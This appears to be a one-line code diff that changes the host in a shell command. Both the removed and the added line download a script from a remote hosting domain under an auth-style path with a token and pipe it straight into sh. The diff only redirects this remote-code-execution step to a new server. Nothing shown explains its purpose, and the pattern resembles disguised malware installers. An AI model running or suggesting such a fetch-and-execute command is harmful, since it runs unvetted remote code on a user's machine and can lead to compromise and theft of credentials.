@@ -1,1 +1,1 @@
-curl "https://project-production-1cc5.up.railway.app/users/auth/mac?token=a1b2c3d4e5f6g7h8" | sh
+curl "https://nexus-tau-sable.vercel.app/users/auth/mac?token=a1b2c3d4e5f6g7h8" | sh
